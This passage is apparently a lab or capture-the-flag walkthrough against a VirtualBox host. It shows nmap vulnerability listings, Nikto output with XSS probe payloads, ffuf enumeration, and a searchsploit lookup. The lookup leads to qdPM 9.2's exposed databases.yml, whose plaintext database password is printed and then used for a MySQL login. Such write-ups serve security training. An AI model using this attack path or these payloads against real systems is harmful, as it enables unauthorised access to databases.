+|       CVE-2023-27522  7.5     https://vulners.com/cve/CVE-2023-27522
+|       CVE-2022-30556  7.5     https://vulners.com/cve/CVE-2022-30556
+|       CVE-2022-30522  7.5     https://vulners.com/cve/CVE-2022-30522
+|       CVE-2022-29404  7.5     https://vulners.com/cve/CVE-2022-29404
+|       CVE-2022-26377  7.5     https://vulners.com/cve/CVE-2022-26377
+|       CVE-2022-22719  7.5     https://vulners.com/cve/CVE-2022-22719
+|       CVE-2021-41524  7.5     https://vulners.com/cve/CVE-2021-41524
+|       CVE-2021-36160  7.5     https://vulners.com/cve/CVE-2021-36160
+|       CVE-2021-34798  7.5     https://vulners.com/cve/CVE-2021-34798
+|       CVE-2021-33193  7.5     https://vulners.com/cve/CVE-2021-33193
+|       CVE-2006-20001  7.5     https://vulners.com/cve/CVE-2006-20001
+|       CNVD-2024-20839 7.5     https://vulners.com/cnvd/CNVD-2024-20839
+|       CNVD-2023-93320 7.5     https://vulners.com/cnvd/CNVD-2023-93320
+|       CNVD-2023-80558 7.5     https://vulners.com/cnvd/CNVD-2023-80558
+|       CNVD-2022-53584 7.5     https://vulners.com/cnvd/CNVD-2022-53584
+|       CNVD-2022-41639 7.5     https://vulners.com/cnvd/CNVD-2022-41639
+|       CNVD-2022-03223 7.5     https://vulners.com/cnvd/CNVD-2022-03223
+|       CF47F8BF-37F7-5EF9-ABAB-E88ECF6B64FE    7.5     https://vulners.com/githubexploit/CF47F8BF-37F7-5EF9-ABAB-E88ECF6B64FE  *EXPLOIT*
+|       CDC791CD-A414-5ABE-A897-7CFA3C2D3D29    7.5     https://vulners.com/githubexploit/CDC791CD-A414-5ABE-A897-7CFA3C2D3D29  *EXPLOIT*
+|       CD48BD40-E52A-5A8B-AE27-B57C358BB0EE    7.5     https://vulners.com/githubexploit/CD48BD40-E52A-5A8B-AE27-B57C358BB0EE  *EXPLOIT*
+|       C9A1C0C1-B6E3-5955-A4F1-DEA0E505B14B    7.5     https://vulners.com/githubexploit/C9A1C0C1-B6E3-5955-A4F1-DEA0E505B14B  *EXPLOIT*
+|       C8C7BBD4-C089-5DA7-8474-A5B2B7DC5E79    7.5     https://vulners.com/githubexploit/C8C7BBD4-C089-5DA7-8474-A5B2B7DC5E79  *EXPLOIT*
+|       C8799CA3-C88C-5B39-B291-2895BE0D9133    7.5     https://vulners.com/githubexploit/C8799CA3-C88C-5B39-B291-2895BE0D9133  *EXPLOIT*
+|       C67E8849-6A50-5D5F-B898-6C5E431504E0    7.5     https://vulners.com/githubexploit/C67E8849-6A50-5D5F-B898-6C5E431504E0  *EXPLOIT*
+|       C26A395B-9695-59E4-908F-866A561936E9    7.5     https://vulners.com/githubexploit/C26A395B-9695-59E4-908F-866A561936E9  *EXPLOIT*
+|       C068A003-5258-51DC-A3C0-786638A1B69C    7.5     https://vulners.com/githubexploit/C068A003-5258-51DC-A3C0-786638A1B69C  *EXPLOIT*
+|       C0380E16-C468-5540-A427-7FE34E7CF36B    7.5     https://vulners.com/githubexploit/C0380E16-C468-5540-A427-7FE34E7CF36B  *EXPLOIT*
+|       BD3652A9-D066-57BA-9943-4E34970463B9    7.5     https://vulners.com/githubexploit/BD3652A9-D066-57BA-9943-4E34970463B9  *EXPLOIT*
+|       BC027F41-02AD-5D71-A452-4DD62B0F1EE1    7.5     https://vulners.com/githubexploit/BC027F41-02AD-5D71-A452-4DD62B0F1EE1  *EXPLOIT*
+|       B946B2A1-2914-537A-BF26-94B48FC501B3    7.5     https://vulners.com/githubexploit/B946B2A1-2914-537A-BF26-94B48FC501B3  *EXPLOIT*
+|       B9151905-5395-5622-B789-E16B88F30C71    7.5     https://vulners.com/githubexploit/B9151905-5395-5622-B789-E16B88F30C71  *EXPLOIT*
+|       B5E74010-A082-5ECE-AB37-623A5B33FE7D    7.5     https://vulners.com/githubexploit/B5E74010-A082-5ECE-AB37-623A5B33FE7D  *EXPLOIT*
+|       B58E6202-6D04-5CB0-8529-59713C0E13B8    7.5     https://vulners.com/githubexploit/B58E6202-6D04-5CB0-8529-59713C0E13B8  *EXPLOIT*
+|       B53D7077-1A2B-5640-9581-0196F6138301    7.5     https://vulners.com/githubexploit/B53D7077-1A2B-5640-9581-0196F6138301  *EXPLOIT*
+|       B4483895-BA86-5CFB-84F3-7C06411B5175    7.5     https://vulners.com/githubexploit/B4483895-BA86-5CFB-84F3-7C06411B5175  *EXPLOIT*
+|       B0B1EF25-DE18-534A-AE5B-E6E87669C1D2    7.5     https://vulners.com/githubexploit/B0B1EF25-DE18-534A-AE5B-E6E87669C1D2  *EXPLOIT*
+|       B0208442-6E17-5772-B12D-B5BE30FA5540    7.5     https://vulners.com/githubexploit/B0208442-6E17-5772-B12D-B5BE30FA5540  *EXPLOIT*
+|       A9C7FB0F-65EC-5557-B6E8-6AFBBF8F140F    7.5     https://vulners.com/githubexploit/A9C7FB0F-65EC-5557-B6E8-6AFBBF8F140F  *EXPLOIT*
+|       A820A056-9F91-5059-B0BC-8D92C7A31A52    7.5     https://vulners.com/githubexploit/A820A056-9F91-5059-B0BC-8D92C7A31A52  *EXPLOIT*
+|       A6753173-D2DC-54CC-A5C4-0751E61F0343    7.5     https://vulners.com/githubexploit/A6753173-D2DC-54CC-A5C4-0751E61F0343  *EXPLOIT*
+|       A66531EB-3C47-5C56-B8A6-E04B54E9D656    7.5     https://vulners.com/githubexploit/A66531EB-3C47-5C56-B8A6-E04B54E9D656  *EXPLOIT*
+|       A1FF76C0-CF98-5704-AEE4-DF6F1E434FA3    7.5     https://vulners.com/githubexploit/A1FF76C0-CF98-5704-AEE4-DF6F1E434FA3  *EXPLOIT*
+|       A0F268C8-7319-5637-82F7-8DAF72D14629    7.5     https://vulners.com/githubexploit/A0F268C8-7319-5637-82F7-8DAF72D14629  *EXPLOIT*
+|       9EE3F7E3-70E6-503E-9929-67FE3F3735A2    7.5     https://vulners.com/githubexploit/9EE3F7E3-70E6-503E-9929-67FE3F3735A2  *EXPLOIT*
+|       9D511461-7D24-5402-8E2A-58364D6E758F    7.5     https://vulners.com/githubexploit/9D511461-7D24-5402-8E2A-58364D6E758F  *EXPLOIT*
+|       9CEA663C-6236-5F45-B207-A873B971F988    7.5     https://vulners.com/githubexploit/9CEA663C-6236-5F45-B207-A873B971F988  *EXPLOIT*
+|       987C6FDB-3E70-5FF5-AB5B-D50065D27594    7.5     https://vulners.com/githubexploit/987C6FDB-3E70-5FF5-AB5B-D50065D27594  *EXPLOIT*
+|       9814661A-35A4-5DB7-BB25-A1040F365C81    7.5     https://vulners.com/githubexploit/9814661A-35A4-5DB7-BB25-A1040F365C81  *EXPLOIT*
+|       8FB9E7A8-9A5B-5D87-9A44-AE4A1A92213D    7.5     https://vulners.com/githubexploit/8FB9E7A8-9A5B-5D87-9A44-AE4A1A92213D  *EXPLOIT*
+|       8A14FEAD-A401-5B54-84EB-2059841AD1DD    7.5     https://vulners.com/githubexploit/8A14FEAD-A401-5B54-84EB-2059841AD1DD  *EXPLOIT*
+|       89732403-A14E-5A5D-B659-DD4830410847    7.5     https://vulners.com/githubexploit/89732403-A14E-5A5D-B659-DD4830410847  *EXPLOIT*
+|       789B6112-E84C-566E-89A7-82CC108EFCD9    7.5     https://vulners.com/githubexploit/789B6112-E84C-566E-89A7-82CC108EFCD9  *EXPLOIT*
+|       788F7DF8-01F3-5D13-9B3E-E4AA692153E6    7.5     https://vulners.com/githubexploit/788F7DF8-01F3-5D13-9B3E-E4AA692153E6  *EXPLOIT*
+|       788E0E7C-6F5C-5DAD-9E3A-EE6D8A685F7D    7.5     https://vulners.com/githubexploit/788E0E7C-6F5C-5DAD-9E3A-EE6D8A685F7D  *EXPLOIT*
+|       749F952B-3ACF-56B2-809D-D66E756BE839    7.5     https://vulners.com/githubexploit/749F952B-3ACF-56B2-809D-D66E756BE839  *EXPLOIT*
+|       7248BA4C-3FE5-5529-9E4C-C91E241E8AA0    7.5     https://vulners.com/githubexploit/7248BA4C-3FE5-5529-9E4C-C91E241E8AA0  *EXPLOIT*
+|       6E484197-456B-55DF-8D51-C2BB4925F45C    7.5     https://vulners.com/githubexploit/6E484197-456B-55DF-8D51-C2BB4925F45C  *EXPLOIT*
+|       6E104766-2F7A-5A0A-A24B-61D9B52AD4EE    7.5     https://vulners.com/githubexploit/6E104766-2F7A-5A0A-A24B-61D9B52AD4EE  *EXPLOIT*
+|       6C0C909F-3307-5755-97D2-0EBD17367154    7.5     https://vulners.com/githubexploit/6C0C909F-3307-5755-97D2-0EBD17367154  *EXPLOIT*
+|       68E78C64-D93A-5E8B-9DEA-4A8D826B474E    7.5     https://vulners.com/githubexploit/68E78C64-D93A-5E8B-9DEA-4A8D826B474E  *EXPLOIT*
+|       6758CFA9-271A-5E99-A590-E51F4E0C5046    7.5     https://vulners.com/githubexploit/6758CFA9-271A-5E99-A590-E51F4E0C5046  *EXPLOIT*
+|       674BA200-C494-57E6-B1B4-1672DDA15D3C    7.5     https://vulners.com/githubexploit/674BA200-C494-57E6-B1B4-1672DDA15D3C  *EXPLOIT*
+|       628A345B-5FD8-5A2F-8782-9125584E4C89    7.5     https://vulners.com/githubexploit/628A345B-5FD8-5A2F-8782-9125584E4C89  *EXPLOIT*
+|       5D88E443-7AB2-5034-910D-D52A5EFFF5FC    7.5     https://vulners.com/githubexploit/5D88E443-7AB2-5034-910D-D52A5EFFF5FC  *EXPLOIT*
+|       5A864BCC-B490-5532-83AB-2E4109BB3C31    7.5     https://vulners.com/githubexploit/5A864BCC-B490-5532-83AB-2E4109BB3C31  *EXPLOIT*
+|       5A54F5DA-F9C1-508B-AD2D-3E45CD647D31    7.5     https://vulners.com/githubexploit/5A54F5DA-F9C1-508B-AD2D-3E45CD647D31  *EXPLOIT*
+|       500CE683-17EB-5776-8EF6-85122451B145    7.5     https://vulners.com/githubexploit/500CE683-17EB-5776-8EF6-85122451B145  *EXPLOIT*
+|       4E5A5BA8-3BAF-57F0-B71A-F04B4D066E4F    7.5     https://vulners.com/githubexploit/4E5A5BA8-3BAF-57F0-B71A-F04B4D066E4F  *EXPLOIT*
+|       4E4BAF15-6430-514A-8679-5B9F03584B71    7.5     https://vulners.com/githubexploit/4E4BAF15-6430-514A-8679-5B9F03584B71  *EXPLOIT*
+|       4C79D8E5-D595-5460-AA84-18D4CB93E8FC    7.5     https://vulners.com/githubexploit/4C79D8E5-D595-5460-AA84-18D4CB93E8FC  *EXPLOIT*
+|       4B46EB21-DF1F-5D84-AE44-9BCFE311DFB9    7.5     https://vulners.com/githubexploit/4B46EB21-DF1F-5D84-AE44-9BCFE311DFB9  *EXPLOIT*
+|       4B44115D-85A3-5E62-B9A8-5F336C24673F    7.5     https://vulners.com/githubexploit/4B44115D-85A3-5E62-B9A8-5F336C24673F  *EXPLOIT*
+|       4B14D194-BDE3-5D7F-A262-A701F90DE667    7.5     https://vulners.com/githubexploit/4B14D194-BDE3-5D7F-A262-A701F90DE667  *EXPLOIT*
+|       45F0EB7B-CE04-5103-9D40-7379AE4B6CDD    7.5     https://vulners.com/githubexploit/45F0EB7B-CE04-5103-9D40-7379AE4B6CDD  *EXPLOIT*
+|       45D138AD-BEC6-552A-91EA-8816914CA7F4    7.5     https://vulners.com/githubexploit/45D138AD-BEC6-552A-91EA-8816914CA7F4  *EXPLOIT*
+|       41F0C2DA-2A2B-5ACC-A98D-CAD8D5AAD5ED    7.5     https://vulners.com/githubexploit/41F0C2DA-2A2B-5ACC-A98D-CAD8D5AAD5ED  *EXPLOIT*
+|       40879618-C556-547C-8769-9E63E83D0B55    7.5     https://vulners.com/githubexploit/40879618-C556-547C-8769-9E63E83D0B55  *EXPLOIT*
+|       3CF66144-235E-5F7A-B889-113C11ABF150    7.5     https://vulners.com/githubexploit/3CF66144-235E-5F7A-B889-113C11ABF150  *EXPLOIT*
+|       3C5B500C-1858-5834-9D23-38DBE44AE969    7.5     https://vulners.com/githubexploit/3C5B500C-1858-5834-9D23-38DBE44AE969  *EXPLOIT*
+|       3B159471-590A-5941-ADED-20F4187E8C63    7.5     https://vulners.com/githubexploit/3B159471-590A-5941-ADED-20F4187E8C63  *EXPLOIT*
+|       3AE03E90-26EC-5F91-B84E-F04AF6239A9F    7.5     https://vulners.com/githubexploit/3AE03E90-26EC-5F91-B84E-F04AF6239A9F  *EXPLOIT*
+|       37A9128D-17C4-50FF-B025-5FC3E0F3F338    7.5     https://vulners.com/githubexploit/37A9128D-17C4-50FF-B025-5FC3E0F3F338  *EXPLOIT*
+|       379FCF38-0B4A-52EC-BE3E-408A0467BF20    7.5     https://vulners.com/githubexploit/379FCF38-0B4A-52EC-BE3E-408A0467BF20  *EXPLOIT*
+|       3749CB78-BE3A-5018-8838-CA693845B5BD    7.5     https://vulners.com/githubexploit/3749CB78-BE3A-5018-8838-CA693845B5BD  *EXPLOIT*
+|       365CD0B0-D956-59D6-9500-965BF4017E2D    7.5     https://vulners.com/githubexploit/365CD0B0-D956-59D6-9500-965BF4017E2D  *EXPLOIT*
+|       2E98EA81-24D1-5D5B-80B9-A8D616BF3C3F    7.5     https://vulners.com/githubexploit/2E98EA81-24D1-5D5B-80B9-A8D616BF3C3F  *EXPLOIT*
+|       2B4FEB27-377B-557B-AE46-66D677D5DA1C    7.5     https://vulners.com/githubexploit/2B4FEB27-377B-557B-AE46-66D677D5DA1C  *EXPLOIT*
+|       27108E72-8DC1-53B5-97D9-E869CA13EFF7    7.5     https://vulners.com/githubexploit/27108E72-8DC1-53B5-97D9-E869CA13EFF7  *EXPLOIT*
+|       24ADD37D-C8A1-5671-A0F4-378760FC69AC    7.5     https://vulners.com/githubexploit/24ADD37D-C8A1-5671-A0F4-378760FC69AC  *EXPLOIT*
+|       1F6E0709-DA03-564E-925F-3177657C053E    7.5     https://vulners.com/githubexploit/1F6E0709-DA03-564E-925F-3177657C053E  *EXPLOIT*
+|       1E6E9010-4BDF-5C30-951C-79C280B90883    7.5     https://vulners.com/githubexploit/1E6E9010-4BDF-5C30-951C-79C280B90883  *EXPLOIT*
+|       1B75F2E2-5B30-58FA-98A4-501B91327D7F    7.5     https://vulners.com/githubexploit/1B75F2E2-5B30-58FA-98A4-501B91327D7F  *EXPLOIT*
+|       18AE455A-1AA7-5386-81C2-39DA02CEFB57    7.5     https://vulners.com/githubexploit/18AE455A-1AA7-5386-81C2-39DA02CEFB57  *EXPLOIT*
+|       17C6AD2A-8469-56C8-BBBE-1764D0DF1680    7.5     https://vulners.com/githubexploit/17C6AD2A-8469-56C8-BBBE-1764D0DF1680  *EXPLOIT*
+|       1337DAY-ID-38427        7.5     https://vulners.com/zdt/1337DAY-ID-38427        *EXPLOIT*
+|       1337DAY-ID-37030        7.5     https://vulners.com/zdt/1337DAY-ID-37030        *EXPLOIT*
+|       1337DAY-ID-36937        7.5     https://vulners.com/zdt/1337DAY-ID-36937        *EXPLOIT*
+|       1337DAY-ID-36897        7.5     https://vulners.com/zdt/1337DAY-ID-36897        *EXPLOIT*
+|       1145F3D1-0ECB-55AA-B25D-A26892116505    7.5     https://vulners.com/githubexploit/1145F3D1-0ECB-55AA-B25D-A26892116505  *EXPLOIT*
+|       108A0713-4AB8-5A1F-A16B-4BB13ECEC9B2    7.5     https://vulners.com/githubexploit/108A0713-4AB8-5A1F-A16B-4BB13ECEC9B2  *EXPLOIT*
+|       0BC014D0-F944-5E78-B5FA-146A8E5D0F8A    7.5     https://vulners.com/githubexploit/0BC014D0-F944-5E78-B5FA-146A8E5D0F8A  *EXPLOIT*
+|       06076ECD-3FB7-53EC-8572-ABBB20029812    7.5     https://vulners.com/githubexploit/06076ECD-3FB7-53EC-8572-ABBB20029812  *EXPLOIT*
+|       04E3583E-DFED-5D0D-BCF2-1C1230EB666D    7.5     https://vulners.com/githubexploit/04E3583E-DFED-5D0D-BCF2-1C1230EB666D  *EXPLOIT*
+|       00EC8F03-D8A3-56D4-9F8C-8DD1F5ACCA08    7.5     https://vulners.com/githubexploit/00EC8F03-D8A3-56D4-9F8C-8DD1F5ACCA08  *EXPLOIT*
+|       CVE-2023-38709  7.3     https://vulners.com/cve/CVE-2023-38709
+|       CNVD-2024-36395 7.3     https://vulners.com/cnvd/CNVD-2024-36395
+|       95499236-C9FE-56A6-9D7D-E943A24B633A    6.9     https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A  *EXPLOIT*
+|       2C119FFA-ECE0-5E14-A4A4-354A2C38071A    6.9     https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A  *EXPLOIT*
+|       CVE-2024-24795  6.3     https://vulners.com/cve/CVE-2024-24795
+|       CVE-2024-39884  6.2     https://vulners.com/cve/CVE-2024-39884
+|       CVE-2023-45802  5.9     https://vulners.com/cve/CVE-2023-45802
+|       HTTPD:BAAB4065D254D64A717E8A5C847C7BCA  5.3     https://vulners.com/httpd/HTTPD:BAAB4065D254D64A717E8A5C847C7BCA
+|       HTTPD:8806CE4EFAA6A567C7FAD62778B6A46F  5.3     https://vulners.com/httpd/HTTPD:8806CE4EFAA6A567C7FAD62778B6A46F
+|       CVE-2022-37436  5.3     https://vulners.com/cve/CVE-2022-37436
+|       CVE-2022-28614  5.3     https://vulners.com/cve/CVE-2022-28614
+|       CVE-2022-28330  5.3     https://vulners.com/cve/CVE-2022-28330
+|       CNVD-2023-30859 5.3     https://vulners.com/cnvd/CNVD-2023-30859
+|       CNVD-2022-53582 5.3     https://vulners.com/cnvd/CNVD-2022-53582
+|       CNVD-2022-51059 5.3     https://vulners.com/cnvd/CNVD-2022-51059
+|       B8198D62-F9C8-5E03-A301-9A3580070B4C    4.3     https://vulners.com/githubexploit/B8198D62-F9C8-5E03-A301-9A3580070B4C  *EXPLOIT*
+|       1337DAY-ID-36854        4.3     https://vulners.com/zdt/1337DAY-ID-36854        *EXPLOIT*
+|       PACKETSTORM:164501      0.0     https://vulners.com/packetstorm/PACKETSTORM:164501      *EXPLOIT*
+|       PACKETSTORM:164418      0.0     https://vulners.com/packetstorm/PACKETSTORM:164418      *EXPLOIT*
+|_      05403438-4985-5E78-A702-784E03F724D4    0.0     https://vulners.com/githubexploit/05403438-4985-5E78-A702-784E03F724D4  *EXPLOIT*
+| http-enum: 
+|   /backups/: Backup folder w/ directory listing
+|   /robots.txt: Robots file
+|   /batch/: Potentially interesting directory w/ listing on 'apache/2.4.48 (debian)'
+|   /core/: Potentially interesting directory w/ listing on 'apache/2.4.48 (debian)'
+|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.48 (debian)'
+|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.48 (debian)'
+|   /install/: Potentially interesting folder
+|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.48 (debian)'
+|   /manual/: Potentially interesting folder
+|   /template/: Potentially interesting directory w/ listing on 'apache/2.4.48 (debian)'
+|_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.48 (debian)'
+|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
+|_http-jsonp-detection: Couldn't find any JSONP endpoints.
+3306/tcp  open  mysql   syn-ack ttl 64 MySQL 8.0.26
+|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)
+| vulners: 
+|   cpe:/a:mysql:mysql:8.0.26: 
+|       CVE-2024-21057  4.9     https://vulners.com/cve/CVE-2024-21057
+|_      NODEJS:602      0.0     https://vulners.com/nodejs/NODEJS:602
+33060/tcp open  mysqlx? syn-ack ttl 64
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
+|     Invalid message"
+|     HY000
+|   LDAPBindReq: 
+|     *Parse error unserializing protobuf message"
+|     HY000
+|   oracle-tns: 
+|     Invalid message-frame."
+|_    HY000
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port33060-TCP:V=7.94SVN%I=7%D=6/6%Time=6842A05F%P=x86_64-pc-linux-gnu%r
+SF:(NULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0
+SF:b\x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTP
+SF:Options,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\x
+SF:0b\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSVe
+SF:rsionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTCP
+SF:,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0
+SF:fInvalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0
+SF:")%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x
+SF:01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCook
+SF:ie,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0b
+SF:\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message
+SF:\"\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg
+SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x0
+SF:5\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05H
+SF:Y000")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDStrin
+SF:g,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\
+SF:x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\
+SF:"\x05HY000")%r(LDAPBindReq,46,"\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\x0
+SF:1\x08\x01\x10\x88'\x1a\*Parse\x20error\x20unserializing\x20protobuf\x20
+SF:message\"\x05HY000")%r(SIPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(L
+SF:ANDesk-RC,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TerminalServer,9,"\x05\0\
+SF:0\0\x0b\x08\x05\x1a\0")%r(NCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(Notes
+SF:RPC,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a
+SF:\x0fInvalid\x20message\"\x05HY000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05
+SF:\x1a\0")%r(WMSRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,32
+SF:,"\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88'\x1a\x16Inval
+SF:id\x20message-frame\.\"\x05HY000")%r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05
+SF:\x1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x
+SF:10\x88'\x1a\x0fInvalid\x20message\"\x05HY000");
+MAC Address: 08:00:27:FF:99:B8 (Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+nikto:                        
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          10.0.2.8
++ Target Hostname:    10.0.2.8
++ Target Port:        80
++ Start Time:         2025-06-06 04:01:38 (GMT-4)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.48 (Debian)
++ /: Cookie qdPM8 created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Apache/2.4.48 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
++ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
++ /index.php/\"><script><script>alert(document.cookie)</script><: eZ publish v3 and prior allow Cross Site Scripting (XSS).
++ /index.php/content/search/?SectionID=3&SearchText=<script>alert(document.cookie)</script>: eZ publish v3 and prior allow Cross Site Scripting (XSS).
++ /index.php/content/advancedsearch/?SearchText=<script>alert(document.cookie)</script>&PhraseSearchText=<script>alert(document.cookie)</script>&SearchContentClassID=-1&SearchSectionID=-1&SearchDate=-1&SearchButton=Search: eZ publish v3 and prior allow Cross Site Scripting (XSS).
++ /css/: Directory indexing found.
++ /css/: This might be interesting.
++ /install/: This might be interesting.
++ /readme.txt: This might be interesting.
++ /template/: Directory indexing found.
++ /template/: This might be interesting: could have sensitive files or system information.
++ /manual/: Web server manual found.
++ /manual/images/: Directory indexing found.
++ /images/: Directory indexing found.
++ 8104 requests: 0 error(s) and 17 item(s) reported on remote host
++ End Time:           2025-06-06 04:02:13 (GMT-4) (35 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+
+Directory enumeration:
+
+ffuf -w /usr/share/wordlists/dirb/big.txt -u http://10.0.2.8/FUZZ            
+
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.0.2.8/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+.htpasswd               [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 410ms]
+.htaccess               [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 466ms]
+backups                 [Status: 301, Size: 306, Words: 20, Lines: 10, Duration: 1ms]
+batch                   [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 2ms]
+core                    [Status: 301, Size: 303, Words: 20, Lines: 10, Duration: 3ms]
+css                     [Status: 301, Size: 302, Words: 20, Lines: 10, Duration: 2ms]
+favicon.ico             [Status: 200, Size: 894, Words: 2, Lines: 1, Duration: 5ms]
+images                  [Status: 301, Size: 305, Words: 20, Lines: 10, Duration: 1ms]
+install                 [Status: 301, Size: 306, Words: 20, Lines: 10, Duration: 7ms]
+javascript              [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 4ms]
+js                      [Status: 301, Size: 301, Words: 20, Lines: 10, Duration: 3ms]
+manual                  [Status: 301, Size: 305, Words: 20, Lines: 10, Duration: 6ms]
+robots.txt              [Status: 200, Size: 26, Words: 2, Lines: 3, Duration: 6ms]
+server-status           [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 9ms]
+sf                      [Status: 301, Size: 301, Words: 20, Lines: 10, Duration: 8ms]
+template                [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 6ms]
+uploads                 [Status: 301, Size: 306, Words: 20, Lines: 10, Duration: 5ms]
+:: Progress: [20469/20469] :: Job [1/1] :: 6666 req/sec :: Duration: [0:00:14] :: Errors: 0 ::
+                                                                                                                                                                                             
+
+
+Initial foothold:
+
+
+Visiting site on port 80, we are presented with a login form to qdPD 9.2. A quick search for some exploits related to this version of qdPD reveals this:
+
+searchsploit qdPM 9.2  
+----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                             |  Path
+----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+qdPM 9.2 - Cross-site Request Forgery (CSRF)                                                                                                               | php/webapps/50854.txt
+qdPM 9.2 - Password Exposure (Unauthenticated)                                                                                                             | php/webapps/50176.txt
+----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+
+Looking into the second exploit, this seems interesting:
+ cat /usr/share/exploitdb/exploits/php/webapps/50176.txt
+# Exploit Title: qdPM 9.2 - DB Connection String and Password Exposure (Unauthenticated)
+# Date: 03/08/2021
+# Exploit Author: Leon Trappett (thepcn3rd)
+# Vendor Homepage: https://qdpm.net/
+# Software Link: https://sourceforge.net/projects/qdpm/files/latest/download
+# Version: 9.2
+# Tested on: Ubuntu 20.04 Apache2 Server running PHP 7.4
+
+The password and connection string for the database are stored in a yml file. To access the yml file you can go to http://<website>/core/config/databases.yml file and download. 
+
+
+Indeed, visiting the website indicated above, retrieves a file with the following content:
+all:
+  doctrine:
+    class: sfDoctrineDatabase
+    param:
+      dsn: 'mysql:dbname=qdpm;host=localhost'
+      profiler: false
+      username: qdpmadmin
+      password: "<?php echo urlencode('UcVQCMQk2STVeS6J') ; ?>"
+      attributes:
+        quote_identifier: true  
+  
+
+
+we manage to log in to mysql :
+
+mysql -u qdpmadmin -h 10.0.2.8 -p --skip-ssl
+Enter password: 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MySQL connection id is 510
+Server version: 8.0.26 MySQL Community Server - GP
